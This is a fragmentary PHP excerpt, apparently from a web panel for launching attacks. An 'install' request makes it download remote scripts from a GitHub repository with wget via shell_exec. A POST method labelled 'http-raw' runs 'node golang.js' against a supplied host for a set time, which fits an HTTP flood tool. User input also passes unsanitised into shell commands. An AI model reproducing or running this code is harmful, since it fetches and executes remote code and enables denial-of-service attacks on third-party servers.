...
if (!empty($_GET["install"])){
	...
	shell_exec("wget -nc https://raw.githubusercontent.com/AntiAzer/djjdjdjd/main/golang.js");
  shell_exec("wget -nc https://raw.githubusercontent.com/AntiAzer/djjdjdjd/main/default.txt");
  shell_exec("wget -nc https://raw.githubusercontent.com/AntiAzer/djjdjdjd/main/default.txt");
...
if (!empty($_POST["method"])){
	...
	if($method == "1"){     //http-raw
		...
		shell_exec("node golang.js $host $time");
	}
